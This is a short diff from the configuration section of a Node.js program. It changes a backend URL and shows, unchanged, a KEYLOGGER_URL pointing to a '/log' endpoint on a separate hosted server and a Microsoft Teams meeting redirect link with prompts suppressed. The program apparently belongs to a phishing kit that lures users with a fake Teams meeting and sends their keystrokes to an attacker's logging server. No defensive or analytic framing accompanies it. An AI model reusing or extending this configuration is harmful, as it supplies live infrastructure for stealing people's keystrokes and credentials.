@@ -10,7 +10,7 @@ const zlib = require('zlib');
 //  CONFIGURATION
 // ============================================================
 
-const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-h5ze.onrender.com";
+const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
 const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
 const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 
